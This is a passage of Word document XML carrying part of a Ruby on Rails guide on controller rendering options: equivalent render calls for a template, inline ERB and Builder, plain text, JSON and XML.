        <w:t xml:space="preserve"> option to render a file, because Windows filenames do not have the same format as Unix filenames.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734042A8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.5 Wrapping it up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034A1C86" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The above three ways of rendering (rendering another template within the controller, rendering a template within another controller and rendering an arbitrary file on the file system) are actually variants of the same action.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D34ECF6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In fact, in the BooksController class, inside of the update action where we want to render the edit template if the book does not update successfully, all of the following render calls would all render the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>edit.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>views/books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7368"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="14433657" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="027380A0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :edit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="241A29C8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :edit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AC1A538" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render 'edit'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11EC0B5F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render 'edit.html.erb'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="277CED91" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'edit'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EB29409" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'edit.html.erb'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23E61E99" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render 'books/edit'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E309AD7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render 'books/edit.html.erb'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39B0F9FB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :template</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'books/edit'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5572DDC9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :template</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'books/edit.html.erb'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32B34C6D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render '/path/to/rails/app/views/books/edit'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2387B45C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render '/path/to/rails/app/views/books/edit.html.erb'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="281F0132" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :file</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '/path/to/rails/app/views/books/edit'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="487D917D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :file</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; '/path/to/rails/app/views/books/edit.html.erb'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7188577B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Which one you use is really a matter of style and convention, but the rule of thumb is to use the simplest one that makes sense for the code you are writing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16910C83" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2.6 Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5599B6C2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method can do without a view completely, if you’re willing to use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inline</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to supply </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>ERB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as part of the method call. This is perfectly valid:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4C2DC858" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="05052106" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :inline</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30D08FEA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "&lt;% products.each do |p| %&gt;&lt;p&gt;&lt;%= p.name %&gt;&lt;/p&gt;&lt;% end %&gt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="136BA4A0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There is seldom any good reason to use this option. Mixing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>ERB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> into your controllers defeats the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> orientation of Rails and will make it harder for other developers to follow the logic of your project. Use a separate erb view instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23973AA2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, inline rendering uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>ERB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can force it to use Builder instead with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6888"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4A96B0C0" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7BB12EA4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :inline</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="575748F5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "xml.p {'Horrid coding practice!'}", :type</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :builder</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1207961C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.7 Rendering Text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48167A47" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can send plain text – with no markup at all – back to the browser by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:text</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="24E54331" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="215DC1EC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1380477409"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :text</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "OK"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A4F7B15" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rendering pure text is most useful when you’re responding to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>AJAX</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or web service requests that are expecting something other than proper </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263184A9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, if you use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:text</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, the text is rendered without using the current layout. If you want Rails to put the text into the current layout, you need to add the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:layout =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54BB0B6E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2.8 Rendering </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>JSON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B2521B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>JSON</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a JavaScript data format used by many </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>AJAX</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> libraries. Rails has built-in support for converting objects to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>JSON</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and rendering that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>JSON</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> back to the browser:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2808"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="248096C5" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="220492CD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1704093625"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :json</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @product</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7424C44D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You don’t need to call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the object that you want to render. If you use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will automatically call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for you.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418BBBC7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2.9 Rendering </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AF9A3C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails also has built-in support for converting objects to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and rendering that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> back to the caller:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2688"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2A4E7DE2" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73BCBA93" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2048286911"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :xml</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @product</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="204010E8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You don’t need to call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the object that you want to render. If you use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will automatically call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for you.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D56AE6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.10 Rendering Vanilla JavaScript</w:t>
      </w:r>
    </w:p>
